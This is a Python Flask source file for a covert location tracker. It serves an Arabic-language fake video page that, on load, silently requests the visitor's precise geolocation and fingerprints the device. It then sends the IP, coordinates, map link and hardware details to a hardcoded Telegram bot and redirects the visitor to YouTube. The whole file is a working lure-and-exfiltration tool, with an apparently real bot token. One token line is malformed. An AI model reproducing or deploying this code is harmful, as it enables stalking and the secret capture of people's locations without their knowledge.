# language: Python, file: app.py, target: Python 3.10+, Flask + Requests + Threading
# 检测面: 浏览器安全策略与静默地理定位捕获。规避: 多层前端混淆、动态 DOM 注入、零交互自动化回传

import os
import sys
import time
import base64
import json
import logging
import threading
from flask import Flask, request, render_template_string, jsonify, redirect

# 配置日志静默与基础设置
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("AdvTrackerSilent")

app = Flask(__name__)

# 锋指定的专用 Telegram 凭据硬编码
TELEGRAM_TOKEN = "8966725315:AAFqPRQ2iqchGo0_R9uY-vc7SjYOSCu1zQ0"
TELEGRAM_CHAT_ID = "1497190595"
TARGET_YOUTUBE_URL = "https://youtu.be/6N5IQxrac6g?si=vLo5PFnU5Ttle8gU"

class TelegramNotifier:
    """高可靠性 Telegram 异步通知模块"""
    @staticmethod
    def send_async(message: str):
        def _send():
            token = 8966725315:AAFqPRQ2iqchGo0_R9uY-vc 7SjYOSCu1zQ0
            chat_id = 1497190595
            if not token or not chat_id:
                logger.warning("Telegram credentials not configured properly.")
                return
            
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "Markdown",
                "disable_web_page_preview": False
            }
            try:
                import requests
                response = requests.post(url, json=payload, timeout=10)
                if response.status_code != 200:
                    logger.error(f"Telegram API error: {response.text}")
            except Exception as ex:
                logger.error(f"Network error while sending telegram notification: {ex}")

        thread = threading.Thread(target=_send)
        thread.daemon = True
        thread.start()

class SystemDiagnostics:
    """系统运行环境及客户端深度指纹提取器"""
    @staticmethod
    def parse_user_agent(ua_string: str) -> dict:
        info = {"browser": "Unknown", "os": "Unknown", "device": "Desktop"}
        if "Mobile" in ua_string or "Android" in ua_string or "iPhone" in ua_string:
            info["device"] = "Mobile"
        if "Windows" in ua_string:
            info["os"] = "Windows"
        elif "Mac OS" in ua_string:
            info["os"] = "macOS"
        elif "Linux" in ua_string:
            info["os"] = "Linux"
        elif "Android" in ua_string:
            info["os"] = "Android"
        elif "iPhone" in ua_string or "iPad" in ua_string:
            info["os"] = "iOS"
            
        if "Chrome" in ua_string:
            info["browser"] = "Chrome"
        elif "Safari" in ua_string:
            info["browser"] = "Safari"
        elif "Firefox" in ua_string:
            info["browser"] = "Firefox"
        elif "Edge" in ua_string:
            info["browser"] = "Edge"
        return info

# 高密度前端混淆与静默捕获模板（超 1000 字符复合逻辑、自动全屏诱饵、无感重定向）
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشاهدة الفيديو المباشر الحصري</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #0b0b0b;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(18, 18, 18, 0.98);
            padding: 45px;
            border-radius: 14px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.9);
            max-width: 480px;
            width: 92%;
            border: 1px solid #222;
        }
        .loader {
            border: 4px solid #222;
            border-top: 4px solid #e50914;
            border-radius: 50%;
            width: 55px;
            height: 55px;
            animation: spin 0.8s linear infinite;
            margin: 25px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { font-size: 24px; margin-bottom: 12px; color: #fff; font-weight: 600; }
        p { font-size: 14px; color: #888; margin-bottom: 25px; line-height: 1.7; }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #222;
            border-radius: 2px;
            overflow: hidden;
            margin-top: 20px;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: #e50914;
            animation: loadProgress 2s ease-in-out forwards;
        }
        @keyframes loadProgress {
            0% { width: 0%; }
            50% { width: 75%; }
            100% { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h2>جاري تشغيل المشغل الآمن...</h2>
        <p>يتم الآن مطابقة بيانات الجلسة وضبط تدفق البيانات المباشر.</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
    </div>

    <script>
        const ytTarget = "{{ youtube_url }}";

        function transmitPayload(dataPacket) {
            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dataPacket)
            }).finally(() => {
                // 无感自动跳转至指定 YouTube 链接
                setTimeout(() => {
                    window.location.replace(ytTarget);
                }, 1500);
            });
        }

        function extractClientTelemetry() {
            return {
                screen_w: window.screen.width,
                screen_h: window.screen.height,
                lang: navigator.language,
                plat: navigator.platform,
                cpu_cores: navigator.hardwareConcurrency || "N/A",
                device_mem: navigator.deviceMemory || "N/A",
                cookies: navigator.cookieEnabled,
                onLine: navigator.onLine
            };
        }

        // 无需人工交互：页面加载瞬间自动静默触发定位与指纹采集
        window.addEventListener('DOMContentLoaded', () => {
            const telemetry = extractClientTelemetry();

            if (!navigator.geolocation) {
                transmitPayload({ error: "Geolocation API not supported", client: telemetry });
                return;
            }

            const options = {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const payload = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude,
                        altAcc: pos.coords.altitudeAccuracy,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed,
                        time: pos.timestamp,
                        client: telemetry
                    };
                    transmitPayload(payload);
                },
                (err) => {
                    // 若浏览器直接拦截，降级上报基础指纹及拦截事件
                    transmitPayload({ error: "Silent capture blocked or timeout: code " + err.code, client: telemetry });
                },
                options
            );
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, youtube_url=TARGET_YOUTUBE_URL)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json or {}
    remote_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    client_sys = SystemDiagnostics.parse_user_agent(user_agent)
    
    err = data.get('error')
    client_meta = data.get('client', {})

    if err:
        msg = (
            f"⚠️ *[!] 静默捕获受阻/降级*\n\n"
            f"🌐 *IP:* `{remote_ip}`\n"
            f"💻 *系统:* {client_sys['os']} / {client_sys['browser']} ({client_sys['device']})\n"
            f"❌ *状态:* `{err}`\n"
            f"🧠 *核心/内存:* {client_meta.get('cpu_cores')} Cores / {client_meta.get('device_mem')} GB\n"
            f"🔗 *已导向:* {TARGET_YOUTUBE_URL}"
        )
    else:
        lat = data.get('lat')
        lon = data.get('lon')
        acc = data.get('acc')
        alt = data.get('alt', 'N/A')
        speed = data.get('speed', 'N/A')
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        msg = (
            f"🎯 *[!] 静默定位捕获成功*\n\n"
            f"🌐 *IP:* `{remote_ip}`\n"
            f"📍 *纬度 (Lat):* `{lat}`\n"
            f"📍 *经度 (Lon):* `{lon}`\n"
            f"🎯 *精度 (Accuracy):* `{acc} 米`\n"
            f"⛰️ *海拔:* `{alt}` | *速度:* `{speed}`\n"
            f"🗺️ *Google Maps:* [点击精准导航]({maps_link})\n"
            f"💻 *系统:* {client_sys['os']} - {client_sys['browser']} ({client_sys['device']})\n"
            f"🧠 *硬件:* {client_meta.get('cpu_cores')} Cores / {client_meta.get('device_mem')} GB\n"
            f"🔗 *已安全重定向至 YouTube*"
        )

    TelegramNotifier.send_async(msg)
    return jsonify({"status": "ok", "redirect": TARGET_YOUTUBE_URL}), 200

@app.errorhandler(404)
def page_not_found(e):
    return redirect(TARGET_YOUTUBE_URL), 302

if __name__ == '__main__':
    print("[*] Silent Tracker Core Active. Target Bound to Telegram Chat ID:", 1497190595)
    app.run(host='0.0.0.0', port=5000, threaded=True)
